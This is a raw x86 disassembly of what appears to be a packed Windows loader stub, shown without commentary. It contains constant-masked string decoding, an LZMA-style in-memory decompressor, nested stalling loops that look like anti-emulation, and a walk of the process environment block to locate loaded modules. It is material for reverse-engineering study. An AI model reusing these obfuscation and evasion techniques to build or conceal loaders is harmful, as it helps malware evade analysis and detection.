  41cf27:	movzx  ebx,BYTE PTR [ecx]
  41cf2a:	xor    ebx,edx
  41cf2c:	add    ebx,eax
  41cf2e:	inc    esi
  41cf2f:	mov    BYTE PTR [ecx],bl
  41cf31:	cmp    esi,0x7
  41cf34:	jb     0x41cf23
  41cf36:	xor    esi,esi
  41cf38:	lea    ecx,[ebp+esi*1-0x28]
  41cf3c:	movzx  ebx,BYTE PTR [ecx]
  41cf3f:	xor    ebx,edx
  41cf41:	add    ebx,eax
  41cf43:	inc    esi
  41cf44:	mov    BYTE PTR [ecx],bl
  41cf46:	cmp    esi,0x8
  41cf49:	jb     0x41cf38
  41cf4b:	lea    eax,[ebp-0x2c]
  41cf4e:	mov    DWORD PTR [ebp-0x8],eax
  41cf51:	mov    ecx,DWORD PTR [ebp-0x8]
  41cf54:	mov    eax,0x7113fcef
  41cf59:	mov    DWORD PTR [ecx],eax
  41cf5b:	mov    ecx,DWORD PTR [ebp-0x2c]
  41cf5e:	cmp    ecx,eax
  41cf60:	jne    0x41cf6c
  41cf62:	mov    DWORD PTR [ebp-0x8],edi
  41cf65:	mov    DWORD PTR [ebp-0x8],0xf89c85ea
  41cf6c:	mov    eax,DWORD PTR [ebp-0x4]
  41cf6f:	mov    ecx,DWORD PTR [eax+0x18c]
  41cf75:	xor    eax,eax
  41cf77:	mov    ebx,0x3272e2
  41cf7c:	cmp    DWORD PTR [ecx],eax
  41cf7e:	jne    0x41d1b6
  41cf84:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf87:	mov    ecx,DWORD PTR [ecx+0x17c]
  41cf8d:	mov    DWORD PTR [ecx],eax
  41cf8f:	mov    ecx,DWORD PTR [ebp-0x4]
  41cf92:	mov    ecx,DWORD PTR [ecx+0x180]
  41cf98:	mov    DWORD PTR [ecx],eax
  41cf9a:	mov    esi,0x4e22
  41cf9f:	mov    eax,0x4f8f
  41cfa4:	mov    WORD PTR [ebp-0x78],ax
  41cfa8:	mov    eax,esi
  41cfaa:	mov    WORD PTR [ebp-0x76],ax
  41cfae:	add    eax,0x5d
  41cfb1:	mov    WORD PTR [ebp-0x74],ax
  41cfb5:	lea    eax,[esi+0x1d]
  41cfb8:	mov    WORD PTR [ebp-0x72],ax
  41cfbc:	mov    eax,0x4f92
  41cfc1:	mov    WORD PTR [ebp-0x70],ax
  41cfc5:	lea    eax,[esi+0x1c]
  41cfc8:	mov    WORD PTR [ebp-0x6e],ax
  41cfcc:	add    eax,0x3f
  41cfcf:	mov    WORD PTR [ebp-0x6c],ax
  41cfd3:	lea    eax,[esi+0x16]
  41cfd6:	mov    WORD PTR [ebp-0x6a],ax
  41cfda:	mov    eax,esi
  41cfdc:	mov    WORD PTR [ebp-0x68],ax
  41cfe0:	add    eax,0x19
  41cfe3:	mov    WORD PTR [ebp-0x66],ax
  41cfe7:	mov    eax,0x99ff
  41cfec:	mov    WORD PTR [ebp-0x64],ax
  41cff0:	mov    eax,0x828e
  41cff5:	mov    WORD PTR [ebp-0x62],ax
  41cff9:	mov    eax,0xd78d
  41cffe:	mov    WORD PTR [ebp-0x60],ax
  41d002:	add    eax,0x1c
  41d005:	mov    WORD PTR [ebp-0x5e],ax
  41d009:	mov    eax,0x27a8
  41d00e:	mov    WORD PTR [ebp-0x5c],ax
  41d012:	mov    eax,0x47a8
  41d017:	mov    WORD PTR [ebp-0x5a],ax
  41d01b:	lea    eax,[esi+0x17]
  41d01e:	push   0x8
  41d020:	mov    WORD PTR [ebp-0x58],ax
  41d024:	mov    DWORD PTR [ebp-0x10],0xb00040f
  41d02b:	mov    DWORD PTR [ebp-0xc],0x7c050c1d
  41d032:	lea    eax,[ebp-0x10]
  41d035:	pop    edi
  41d036:	mov    cl,BYTE PTR [eax]
  41d038:	xor    cl,dl
  41d03a:	sub    cl,0x8
  41d03d:	mov    BYTE PTR [eax],cl
  41d03f:	inc    eax
  41d040:	dec    edi
  41d041:	jne    0x41d036
  41d043:	lea    eax,[ebp-0x10]
  41d046:	mov    DWORD PTR [ebp-0xb8],eax
  41d04c:	lea    eax,[ebp-0xbc]
  41d052:	push   eax
  41d053:	mov    eax,DWORD PTR [ebp+0xc]
  41d056:	mov    edi,0x751089b
  41d05b:	xor    eax,edi
  41d05d:	add    eax,ebx
  41d05f:	push   eax
  41d060:	mov    eax,DWORD PTR [ebp-0x4]
  41d063:	add    eax,0x66
  41d066:	push   eax
  41d067:	mov    eax,DWORD PTR [ebp-0x4]
  41d06a:	mov    eax,DWORD PTR [eax+0x198]
  41d070:	mov    DWORD PTR [ebp-0xbc],0x1
  41d07a:	push   DWORD PTR [eax]
  41d07c:	mov    eax,DWORD PTR [ebp+0x10]
  41d07f:	call   eax
  41d081:	mov    ecx,DWORD PTR [ebp+0x8]
  41d084:	xor    ecx,edi
  41d086:	add    ecx,ebx
  41d088:	mov    DWORD PTR [ebp-0x8],eax
  41d08b:	cmp    eax,ecx
  41d08d:	jne    0x41d0a8
  41d08f:	mov    eax,ds:0x33730bee
  41d094:	or     eax,0x22150bef
  41d099:	mov    ds:0x33730bee,eax
  41d09e:	add    eax,0x3372e90f
  41d0a3:	mov    ds:0x33730bee,eax
  41d0a8:	mov    ecx,0x4f8a
  41d0ad:	mov    eax,ecx
  41d0af:	mov    WORD PTR [ebp-0x40],ax
  41d0b3:	mov    eax,0x4e71
  41d0b8:	mov    edx,eax
  41d0ba:	mov    WORD PTR [ebp-0x3e],dx
  41d0be:	lea    edx,[ecx+0xf]
  41d0c1:	mov    WORD PTR [ebp-0x3c],dx
  41d0c5:	add    edx,0xfffffff8
  41d0c8:	mov    WORD PTR [ebp-0x3a],dx
  41d0cc:	lea    edx,[ecx+0x9]
  41d0cf:	mov    WORD PTR [ebp-0x38],dx
  41d0d3:	add    edx,0x19
  41d0d6:	mov    WORD PTR [ebp-0x36],dx
  41d0da:	lea    edx,[ecx+0x1b]
  41d0dd:	mov    WORD PTR [ebp-0x34],dx
  41d0e1:	mov    WORD PTR [ebp-0x32],cx
  41d0e5:	mov    ecx,esi
  41d0e7:	mov    WORD PTR [ebp-0x30],cx
  41d0eb:	lea    ecx,[edx+0x5]
  41d0ee:	mov    edx,ecx
  41d0f0:	mov    WORD PTR [ebp-0x54],dx
  41d0f4:	mov    edx,eax
  41d0f6:	mov    WORD PTR [ebp-0x52],dx
  41d0fa:	add    edx,0x8
  41d0fd:	mov    WORD PTR [ebp-0x50],dx
  41d101:	mov    WORD PTR [ebp-0x4e],ax
  41d105:	add    eax,0x2
  41d108:	mov    WORD PTR [ebp-0x4c],ax
  41d10c:	lea    eax,[ecx-0x1e]
  41d10f:	mov    WORD PTR [ebp-0x4a],ax
  41d113:	add    eax,0xfffffff9
  41d116:	mov    WORD PTR [ebp-0x48],ax
  41d11a:	mov    WORD PTR [ebp-0x46],cx
  41d11e:	mov    WORD PTR [ebp-0x44],si
  41d122:	mov    eax,DWORD PTR [ebp+0x8]
  41d125:	movzx  ecx,WORD PTR [ebp-0x54]
  41d129:	xor    eax,edi
  41d12b:	add    eax,ebx
  41d12d:	xor    eax,ecx
  41d12f:	mov    WORD PTR [ebp-0x54],ax
  41d133:	mov    eax,DWORD PTR [ebp+0x8]
  41d136:	movzx  ecx,WORD PTR [ebp-0x40]
  41d13a:	xor    eax,edi
  41d13c:	add    eax,ebx
  41d13e:	xor    eax,ecx
  41d140:	mov    WORD PTR [ebp-0x40],ax
  41d144:	xor    eax,eax
  41d146:	mov    WORD PTR [ebp-0xd0],ax
  41d14d:	mov    WORD PTR [ebp-0xe4],ax
  41d154:	mov    edi,DWORD PTR [ebp+0x24]
  41d157:	lea    eax,[ebp-0xd0]
  41d15d:	lea    edx,[ebp-0x54]
  41d160:	mov    DWORD PTR [ebp-0xbc],0x2
  41d16a:	mov    DWORD PTR [ebp-0xb8],eax
  41d170:	call   0x41fafc
  41d175:	mov    DWORD PTR [ebp-0xb4],eax
  41d17b:	lea    eax,[ebp-0xbc]
  41d181:	push   eax
  41d182:	mov    eax,DWORD PTR [ebp+0xc]
  41d185:	xor    eax,0x751089b
  41d18a:	add    eax,ebx
  41d18c:	push   eax
  41d18d:	lea    eax,[ebp-0x78]
  41d190:	push   eax
  41d191:	push   DWORD PTR [ebp-0x8]
  41d194:	mov    eax,DWORD PTR [ebp+0x10]
  41d197:	call   eax
  41d199:	mov    edi,DWORD PTR [ebp+0x24]
  41d19c:	lea    eax,[ebp-0xe4]
  41d1a2:	lea    edx,[ebp-0x40]
  41d1a5:	mov    DWORD PTR [ebp-0xb8],eax
  41d1ab:	call   0x41fafc
  41d1b0:	mov    DWORD PTR [ebp-0xb4],eax
  41d1b6:	mov    eax,DWORD PTR [ebp+0x14]
  41d1b9:	push   DWORD PTR [ebp-0x4]
  41d1bc:	push   DWORD PTR [ebp+0x20]
  41d1bf:	push   DWORD PTR [ebp+0x1c]
  41d1c2:	push   DWORD PTR [ebp+0x18]
  41d1c5:	push   DWORD PTR [ebp+0x10]
  41d1c8:	push   DWORD PTR [ebp+0x8]
  41d1cb:	push   DWORD PTR [ebp+0xc]
  41d1ce:	call   0x41e378
  41d1d3:	test   eax,eax
  41d1d5:	je     0x41d21c
  41d1d7:	add    DWORD PTR [ebp-0x4],eax
  41d1da:	push   DWORD PTR [ebp-0x4]
  41d1dd:	lea    esi,[ebp+0x4]
  41d1e0:	call   0x41d60c
  41d1e5:	mov    eax,DWORD PTR [ebp-0x4]
  41d1e8:	mov    eax,DWORD PTR [eax+0x1c8]
  41d1ee:	mov    eax,DWORD PTR [eax]
  41d1f0:	xor    eax,0x751089b
  41d1f5:	add    eax,ebx
  41d1f7:	mov    eax,DWORD PTR [ebp-0x4]
  41d1fa:	jne    0x41d212
  41d1fc:	mov    ecx,DWORD PTR [ebp-0x4]
  41d1ff:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41d205:	push   DWORD PTR [ecx]
  41d207:	mov    eax,DWORD PTR [eax+0x1d8]
  41d20d:	call   DWORD PTR [eax+0x28]
  41d210:	jmp    0x41d21c
  41d212:	mov    eax,DWORD PTR [eax+0x17c]
  41d218:	mov    eax,DWORD PTR [eax]
  41d21a:	add    DWORD PTR [esi],eax
  41d21c:	pop    esi
  41d21d:	pop    edi
  41d21e:	pop    ebx
  41d21f:	leave  
  41d220:	ret    0x20
  41d223:	push   edi
  41d224:	push   esi
  41d225:	push   ebx
  41d226:	push   ebp
  41d227:	mov    ebp,esp
  41d229:	mov    eax,DWORD PTR [ebp+0x24]
  41d22c:	add    DWORD PTR [ebp+0x28],eax
  41d22f:	push   eax
  41d230:	cld    
  41d231:	mov    esi,DWORD PTR [ebp+0x18]
  41d234:	add    DWORD PTR [ebp+0x1c],esi
  41d237:	push   esi
  41d238:	mov    esi,DWORD PTR [ebp+0x14]
  41d23b:	lods   eax,DWORD PTR ds:[esi]
  41d23c:	xchg   edx,eax
  41d23d:	push   edx
  41d23e:	mov    cl,BYTE PTR [esi-0x2]
  41d241:	or     eax,0xffffffff
  41d244:	shl    eax,cl
  41d246:	not    eax
  41d248:	push   eax
  41d249:	mov    cl,dh
  41d24b:	or     eax,0xffffffff
  41d24e:	shl    eax,cl
  41d250:	not    eax
  41d252:	push   eax
  41d253:	add    cl,dl
  41d255:	mov    edi,esi
  41d257:	sub    esp,0xc
  41d25a:	sub    eax,eax
  41d25c:	inc    eax
  41d25d:	push   eax
  41d25e:	push   eax
  41d25f:	push   eax
  41d260:	push   eax
  41d261:	push   eax
  41d262:	push   edi
  41d263:	sub    esi,esi
  41d265:	push   esi
  41d266:	or     ebx,0xffffffff
  41d269:	mov    eax,0x300
  41d26e:	shl    eax,cl
  41d270:	lea    ecx,[eax+0x736]
  41d276:	mov    eax,0x4000400
  41d27b:	shr    ecx,1
  41d27d:	rep stos DWORD PTR es:[edi],eax
  41d27f:	push   0x5
  41d281:	pop    ecx
  41d282:	call   0x41d56d
  41d287:	loop   0x41d282
  41d289:	lea    esi,[esi]
  41d28b:	lea    edi,[edi]
  41d28d:	mov    edi,DWORD PTR [ebp-0x4]
  41d290:	mov    eax,DWORD PTR [ebp-0x10]
  41d293:	sub    edi,DWORD PTR [ebp+0x24]
  41d296:	and    eax,edi
  41d298:	mov    DWORD PTR [ebp-0x18],eax
  41d29b:	mov    al,0x0
  41d29d:	call   0x41d585
  41d2a2:	jne    0x41d33d
  41d2a8:	mov    cl,BYTE PTR [ebp-0xc]
  41d2ab:	and    edi,DWORD PTR [ebp-0x14]
  41d2ae:	shl    edi,cl
  41d2b0:	sub    cl,0x8
  41d2b3:	neg    cl
  41d2b5:	shr    esi,cl
  41d2b7:	pop    eax
  41d2b8:	add    edi,esi
  41d2ba:	pop    esi
  41d2bb:	lea    edi,[edi+edi*2]
  41d2be:	shl    edi,0x8
  41d2c1:	cmp    al,0x7
  41d2c3:	pop    edx
  41d2c4:	lea    ecx,[esi+edi*2+0xe6c]
  41d2cb:	push   ecx
  41d2cc:	push   esi
  41d2cd:	mov    esi,0x100
  41d2d2:	push   eax
  41d2d3:	mov    al,0x1
  41d2d5:	jb     0x41d30b
  41d2d7:	mov    edi,DWORD PTR [ebp-0x4]
  41d2da:	sub    edi,DWORD PTR [ebp-0x24]
  41d2dd:	movzx  edi,BYTE PTR [edi]
  41d2e0:	mov    ebp,DWORD PTR [ebp-0x34]
  41d2e3:	shl    edi,1
  41d2e5:	mov    ecx,esi
  41d2e7:	and    esi,edi
  41d2e9:	add    ecx,esi
  41d2eb:	lea    ebp,[ebp+ecx*2+0x0]
  41d2ef:	call   0x41d5a4
  41d2f4:	mov    ecx,eax
  41d2f6:	shr    esi,0x8
  41d2f9:	and    ecx,0x1
  41d2fc:	cmp    esi,ecx
  41d2fe:	mov    esi,0x100
  41d303:	jne    0x41d313
  41d305:	cmp    eax,esi
  41d307:	jb     0x41d2e0
  41d309:	jmp    0x41d31f
  41d30b:	mov    ebp,DWORD PTR [ebp-0x34]
  41d30e:	call   0x41d5a4
  41d313:	inc    eax
  41d314:	inc    esi
  41d315:	sub    eax,0x1
  41d318:	sub    esi,0x1
  41d31b:	cmp    eax,esi
  41d31d:	jb     0x41d30b
  41d31f:	pop    edx
  41d320:	inc    edx
  41d321:	cmp    edx,0x5
  41d324:	dec    edx
  41d325:	mov    ecx,edx
  41d327:	jb     0x41d338
  41d329:	inc    edx
  41d32a:	cmp    edx,0xb
  41d32d:	dec    edx
  41d32e:	mov    cl,0x4
  41d330:	dec    cl
  41d332:	jb     0x41d338
  41d334:	mov    cl,0x7
  41d336:	dec    cl
  41d338:	sub    edx,ecx
  41d33a:	push   edx
  41d33b:	jmp    0x41d38c
  41d33d:	mov    al,0xc1
  41d33f:	dec    al
  41d341:	call   0x41d595
  41d346:	jne    0x41d35c
  41d348:	pop    eax
  41d349:	pop    edi
  41d34a:	pop    edx
  41d34b:	pop    ecx
  41d34c:	pop    edx
  41d34d:	pop    ecx
  41d34e:	push   DWORD PTR [esp]
  41d351:	push   ecx
  41d352:	push   edx
  41d353:	mov    edx,0x664
  41d358:	mov    cl,0x0
  41d35a:	jmp    0x41d3cf
  41d35c:	mov    al,0xcd
  41d35e:	dec    al
  41d360:	call   0x41d595
  41d365:	jne    0x41d395
  41d367:	mov    al,0xf1
  41d369:	dec    al
  41d36b:	call   0x41d585
  41d370:	jne    0x41d3c5
  41d372:	pop    eax
  41d373:	cmp    al,0x7
  41d375:	mov    al,0x9
  41d377:	jb     0x41d37b
  41d379:	mov    al,0xb
  41d37b:	push   eax
  41d37c:	mov    esi,DWORD PTR [ebp-0x4]
  41d37f:	sub    esi,DWORD PTR [ebp-0x24]
  41d382:	cmp    esi,DWORD PTR [ebp+0x24]
  41d385:	jb     0x41d55c
  41d38b:	lods   al,BYTE PTR ds:[esi]
  41d38c:	mov    edi,DWORD PTR [ebp-0x4]
  41d38f:	stos   BYTE PTR es:[edi],al
  41d390:	jmp    0x41d523
  41d395:	mov    al,0xd8
  41d397:	call   0x41d595
  41d39c:	mov    esi,DWORD PTR [ebp-0x28]
  41d39f:	je     0x41d3bc
  41d3a1:	mov    al,0xe4
  41d3a3:	call   0x41d595
  41d3a8:	mov    esi,DWORD PTR [ebp-0x2c]
  41d3ab:	je     0x41d3b6
  41d3ad:	mov    esi,DWORD PTR [ebp-0x30]
  41d3b0:	mov    ecx,DWORD PTR [ebp-0x2c]
  41d3b3:	mov    DWORD PTR [ebp-0x30],ecx
  41d3b6:	mov    ecx,DWORD PTR [ebp-0x28]
  41d3b9:	mov    DWORD PTR [ebp-0x2c],ecx
  41d3bc:	mov    ecx,DWORD PTR [ebp-0x24]
  41d3bf:	mov    DWORD PTR [ebp-0x28],ecx
  41d3c2:	mov    DWORD PTR [ebp-0x24],esi
  41d3c5:	pop    eax
  41d3c6:	pop    edi
  41d3c7:	pop    ecx
  41d3c8:	mov    edx,0xa68
  41d3cd:	mov    cl,0x8
  41d3cf:	add    edx,edi
  41d3d1:	push   edx
  41d3d2:	push   edi
  41d3d3:	cmp    al,0x7
  41d3d5:	mov    al,cl
  41d3d7:	jb     0x41d3db
  41d3d9:	add    al,0x3
  41d3db:	push   eax
  41d3dc:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3df:	call   0x41d5a2
  41d3e4:	jne    0x41d3fa
  41d3e6:	mov    eax,DWORD PTR [ebp-0x18]
  41d3e9:	mov    edi,DWORD PTR [ebp-0x34]
  41d3ec:	shl    eax,0x3
  41d3ef:	sub    ecx,ecx
  41d3f1:	push   0x8
  41d3f3:	pop    esi
  41d3f4:	lea    edi,[edi+eax*2+0x4]
  41d3f8:	jmp    0x41d42f
  41d3fa:	mov    ebp,DWORD PTR [ebp-0x34]
  41d3fd:	add    ebp,0x2
  41d400:	call   0x41d5a2
  41d405:	jne    0x41d41f
  41d407:	mov    eax,DWORD PTR [ebp-0x18]
  41d40a:	mov    edi,DWORD PTR [ebp-0x34]
  41d40d:	shl    eax,0x3
  41d410:	push   0x8
  41d412:	pop    ecx
  41d413:	push   0x8
  41d415:	pop    esi
  41d416:	lea    edi,[edi+eax*2+0x104]
  41d41d:	jmp    0x41d42f
  41d41f:	mov    edi,0x204
  41d424:	add    edi,DWORD PTR [ebp-0x34]
  41d427:	push   0x10
  41d429:	pop    ecx
  41d42a:	mov    esi,0x100
  41d42f:	mov    DWORD PTR [ebp-0x1c],ecx
  41d432:	sub    eax,eax
  41d434:	inc    eax
  41d435:	mov    ebp,edi
  41d437:	call   0x41d5a4
  41d43c:	mov    ecx,eax
  41d43e:	sub    ecx,esi
  41d440:	jb     0x41d435
  41d442:	add    DWORD PTR [ebp-0x1c],ecx
  41d445:	cmp    DWORD PTR [ebp-0x3c],0x4
  41d449:	jae    0x41d4ff
  41d44f:	add    DWORD PTR [ebp-0x3c],0x7
  41d453:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d456:	cmp    ecx,0x4
  41d459:	jb     0x41d45e
  41d45b:	push   0x3
  41d45d:	pop    ecx
  41d45e:	mov    edi,DWORD PTR [ebp-0x38]
  41d461:	shl    ecx,0x6
  41d464:	sub    eax,eax
  41d466:	inc    eax
  41d467:	push   0x40
  41d469:	pop    esi
  41d46a:	lea    edi,[edi+ecx*2+0x360]
  41d471:	mov    ebp,edi
  41d473:	call   0x41d5a4
  41d478:	mov    ecx,eax
  41d47a:	sub    ecx,esi
  41d47c:	jb     0x41d471
  41d47e:	mov    DWORD PTR [ebp-0x18],ecx
  41d481:	mov    DWORD PTR [ebp-0x24],ecx
  41d484:	cmp    ecx,0x4
  41d487:	jb     0x41d4fc
  41d489:	mov    esi,ecx
  41d48b:	and    DWORD PTR [ebp-0x24],0x1
  41d48f:	shr    esi,1
  41d491:	or     DWORD PTR [ebp-0x24],0x2
  41d495:	dec    esi
  41d496:	cmp    ecx,0xe
  41d499:	jae    0x41d4b4
  41d49b:	mov    eax,0x2af
  41d4a0:	sub    eax,ecx
  41d4a2:	mov    ecx,esi
  41d4a4:	shl    BYTE PTR [ebp-0x24],cl
  41d4a7:	add    eax,DWORD PTR [ebp-0x24]
  41d4aa:	shl    eax,1
  41d4ac:	add    eax,DWORD PTR [ebp-0x38]
  41d4af:	mov    DWORD PTR [ebp-0x34],eax
  41d4b2:	jmp    0x41d4e1
  41d4b4:	sub    esi,0x4
  41d4b7:	call   0x41d561
  41d4bc:	shr    ebx,1
  41d4be:	shl    DWORD PTR [ebp-0x24],1
  41d4c1:	cmp    DWORD PTR [ebp-0x20],ebx
  41d4c4:	jb     0x41d4cc
  41d4c6:	inc    DWORD PTR [ebp-0x24]
  41d4c9:	sub    DWORD PTR [ebp-0x20],ebx
  41d4cc:	dec    esi
  41d4cd:	jne    0x41d4b7
  41d4cf:	mov    eax,0x644
  41d4d4:	add    eax,DWORD PTR [ebp-0x38]
  41d4d7:	mov    DWORD PTR [ebp-0x34],eax
  41d4da:	shl    DWORD PTR [ebp-0x24],0x4
  41d4de:	push   0x4
  41d4e0:	pop    esi
  41d4e1:	sub    edi,edi
  41d4e3:	inc    edi
  41d4e4:	mov    eax,edi
  41d4e6:	mov    ebp,DWORD PTR [ebp-0x34]
  41d4e9:	call   0x41d5a4
  41d4ee:	test   al,0x1
  41d4f0:	je     0x41d4f5
  41d4f2:	or     DWORD PTR [ebp-0x24],edi
  41d4f5:	shl    edi,1
  41d4f7:	dec    esi
  41d4f8:	jne    0x41d4e6
  41d4fa:	jmp    0x41d4fc
  41d4fc:	inc    DWORD PTR [ebp-0x24]
  41d4ff:	mov    ecx,DWORD PTR [ebp-0x1c]
  41d502:	add    ecx,0x2
  41d505:	mov    edi,DWORD PTR [ebp-0x4]
  41d508:	mov    eax,edi
  41d50a:	sub    eax,DWORD PTR [ebp+0x24]
  41d50d:	cmp    DWORD PTR [ebp-0x24],eax
  41d510:	ja     0x41d55c
  41d512:	mov    esi,edi
  41d514:	sub    esi,DWORD PTR [ebp-0x24]
  41d517:	mov    edx,DWORD PTR [ebp+0x28]
  41d51a:	lods   al,BYTE PTR ds:[esi]
  41d51b:	stos   BYTE PTR es:[edi],al
  41d51c:	cmp    edi,edx
  41d51e:	jae    0x41d523
  41d520:	dec    ecx
  41d521:	jne    0x41d51a
  41d523:	mov    DWORD PTR [ebp-0x4],edi
  41d526:	movzx  esi,al
  41d529:	cmp    edi,DWORD PTR [ebp+0x28]
  41d52c:	jb     0x41d28d
  41d532:	call   0x41d561
  41d537:	sub    eax,eax
  41d539:	lea    ebp,[esp+0x3c]
  41d53d:	mov    edx,DWORD PTR [ebp+0x20]
  41d540:	mov    esi,DWORD PTR [ebp-0x8]
  41d543:	sub    esi,DWORD PTR [ebp+0x18]
  41d546:	mov    DWORD PTR [edx],esi
  41d548:	mov    edx,DWORD PTR [ebp+0x2c]
  41d54b:	mov    edi,DWORD PTR [ebp-0x4]
  41d54e:	sub    edi,DWORD PTR [ebp+0x24]
  41d551:	mov    DWORD PTR [edx],edi
  41d553:	leave  
  41d554:	pop    ebx
  41d555:	pop    esi
  41d556:	pop    edi
  41d557:	ret    0x1c
  41d55a:	pop    esi
  41d55b:	pop    eax
  41d55c:	sub    eax,eax
  41d55e:	inc    eax
  41d55f:	jmp    0x41d539
  41d561:	cmp    ebx,0x1000000
  41d567:	jb     0x41d56a
  41d569:	ret    
  41d56a:	shl    ebx,0x8
  41d56d:	push   esi
  41d56e:	mov    esi,DWORD PTR [ebp-0x8]
  41d571:	cmp    esi,DWORD PTR [ebp+0x1c]
  41d574:	jae    0x41d55a
  41d576:	mov    eax,DWORD PTR [ebp-0x20]
  41d579:	shl    eax,0x8
  41d57c:	lods   al,BYTE PTR ds:[esi]
  41d57d:	mov    DWORD PTR [ebp-0x20],eax
  41d580:	mov    DWORD PTR [ebp-0x8],esi
  41d583:	pop    esi
  41d584:	ret    
  41d585:	mov    ecx,DWORD PTR [ebp-0x3c]
  41d588:	movzx  eax,al
  41d58b:	shl    ecx,0x4
  41d58e:	add    eax,DWORD PTR [ebp-0x18]
  41d591:	add    eax,ecx
  41d593:	jmp    0x41d59b
  41d595:	movzx  eax,al
  41d598:	add    eax,DWORD PTR [ebp-0x3c]
  41d59b:	mov    ebp,DWORD PTR [ebp-0x38]
  41d59e:	lea    ebp,[ebp+eax*2+0x0]
  41d5a2:	sub    eax,eax
  41d5a4:	lea    ebp,[ebp+eax*2+0x0]
  41d5a8:	cmp    ebx,0x1000000
  41d5ae:	jae    0x41d5cc
  41d5b0:	mov    ecx,DWORD PTR [esp+0x38]
  41d5b4:	shl    DWORD PTR [esp+0x20],0x8
  41d5b9:	cmp    ecx,DWORD PTR [esp+0x5c]
  41d5bd:	jae    0x41d55b
  41d5bf:	mov    dl,BYTE PTR [ecx]
  41d5c1:	inc    DWORD PTR [esp+0x38]
  41d5c5:	shl    ebx,0x8
  41d5c8:	mov    BYTE PTR [esp+0x20],dl
  41d5cc:	mov    ecx,ebx
  41d5ce:	movzx  edx,WORD PTR [ebp+0x0]
  41d5d2:	shr    ecx,0xb
  41d5d5:	imul   ecx,edx
  41d5d8:	cmp    DWORD PTR [esp+0x20],ecx
  41d5dc:	jae    0x41d5f5
  41d5de:	mov    ebx,ecx
  41d5e0:	mov    ecx,0x800
  41d5e5:	sub    ecx,edx
  41d5e7:	shr    ecx,0x5
  41d5ea:	add    WORD PTR [ebp+0x0],cx
  41d5ee:	add    eax,eax
  41d5f0:	lea    ebp,[esp+0x40]
  41d5f4:	ret    
  41d5f5:	shr    edx,0x5
  41d5f8:	sub    DWORD PTR [esp+0x20],ecx
  41d5fc:	sub    ebx,ecx
  41d5fe:	sub    WORD PTR [ebp+0x0],dx
  41d602:	add    eax,eax
  41d604:	add    eax,0x1
  41d607:	lea    ebp,[esp+0x40]
  41d60b:	ret    
  41d60c:	push   ebp
  41d60d:	mov    ebp,esp
  41d60f:	sub    esp,0x104
  41d615:	push   ebx
  41d616:	push   esi
  41d617:	push   edi
  41d618:	mov    DWORD PTR [ebp-0x14],0xf89c8585
  41d61f:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  41d626:	mov    eax,DWORD PTR [ebp+0x8]
  41d629:	mov    DWORD PTR [ebp+0x8],eax
  41d62c:	mov    ecx,DWORD PTR [ebp-0x14]
  41d62f:	mov    ebx,0x751089b
  41d634:	xor    ecx,ebx
  41d636:	mov    eax,0x3272e2
  41d63b:	add    ecx,eax
  41d63d:	mov    DWORD PTR [ebp-0x2c],ecx
  41d640:	mov    ecx,DWORD PTR [ebp-0x14]
  41d643:	xor    ecx,ebx
  41d645:	add    ecx,eax
  41d647:	mov    DWORD PTR [ebp-0x3c],ecx
  41d64a:	mov    ecx,DWORD PTR [ebp-0x14]
  41d64d:	xor    ecx,ebx
  41d64f:	add    ecx,eax
  41d651:	mov    DWORD PTR [ebp-0x40],ecx
  41d654:	mov    ecx,DWORD PTR [ebp-0x14]
  41d657:	xor    ecx,ebx
  41d659:	add    ecx,eax
  41d65b:	mov    DWORD PTR [ebp-0xa0],ecx
  41d661:	mov    DWORD PTR [ebp-0x50],0xf89f0585
  41d668:	mov    DWORD PTR [ebp-0x40],0xf89cb585
  41d66f:	mov    DWORD PTR [ebp-0x4c],0xf89c85b9
  41d676:	push   0x25
  41d678:	pop    ecx
  41d679:	mov    DWORD PTR [ebp-0x34],ecx
  41d67c:	mov    DWORD PTR [ebp-0x34],ecx
  41d67f:	push   0x65
  41d681:	pop    ecx
  41d682:	mov    DWORD PTR [ebp-0x34],ecx
  41d685:	mov    DWORD PTR [ebp-0x34],ecx
  41d688:	mov    DWORD PTR [ebp-0x34],0x4d
  41d68f:	mov    DWORD PTR [ebp-0x34],0x43
  41d696:	mov    ecx,DWORD PTR [ebp-0x14]
  41d699:	xor    ecx,ebx
  41d69b:	add    ecx,eax
  41d69d:	mov    DWORD PTR [ebp-0x34],ecx
  41d6a0:	mov    ecx,DWORD PTR [ebp-0x14]
  41d6a3:	xor    ecx,ebx
  41d6a5:	add    ecx,eax
  41d6a7:	mov    DWORD PTR [ebp-0x34],ecx
  41d6aa:	mov    DWORD PTR [ebp-0x28],0x257
  41d6b1:	mov    DWORD PTR [ebp-0x20],0x35
  41d6b8:	mov    DWORD PTR [ebp-0x10],0x79
  41d6bf:	lea    edi,[ebp-0xe4]
  41d6c5:	lea    esi,[ebp-0x104]
  41d6cb:	call   0x41e2e7
  41d6d0:	dec    DWORD PTR [ebp-0x10]
  41d6d3:	jne    0x41d6bf
  41d6d5:	dec    DWORD PTR [ebp-0x20]
  41d6d8:	jne    0x41d6b8
  41d6da:	dec    DWORD PTR [ebp-0x28]
  41d6dd:	jne    0x41d6b1
  41d6df:	mov    DWORD PTR [ebp-0x28],0x400d
  41d6e6:	mov    eax,DWORD PTR [ebp-0x14]
  41d6e9:	xor    eax,ebx
  41d6eb:	mov    esi,0x3272e2
  41d6f0:	add    eax,esi
  41d6f2:	mov    DWORD PTR [ebp-0x8],eax
  41d6f5:	mov    eax,DWORD PTR [ebp-0x14]
  41d6f8:	and    DWORD PTR [ebp-0x94],0x0
  41d6ff:	xor    eax,ebx
  41d701:	add    eax,esi
  41d703:	mov    DWORD PTR [ebp-0x38],eax
  41d706:	mov    eax,fs:0x18
  41d70c:	mov    DWORD PTR [ebp-0x94],eax
  41d712:	mov    eax,DWORD PTR [eax+0x30]
  41d715:	mov    DWORD PTR [ebp-0x98],eax
  41d71b:	mov    eax,DWORD PTR [eax+0xc]
  41d71e:	mov    DWORD PTR [ebp-0xc0],eax
  41d724:	mov    eax,DWORD PTR [ebp+0x8]
  41d727:	lea    ecx,[ebp-0x94]
  41d72d:	mov    DWORD PTR [eax+0x1a0],ecx
  41d733:	mov    eax,DWORD PTR [ebp+0x8]
  41d736:	lea    ecx,[ebp-0x98]
  41d73c:	mov    DWORD PTR [eax+0x1a4],ecx
  41d742:	mov    eax,DWORD PTR [ebp+0x8]
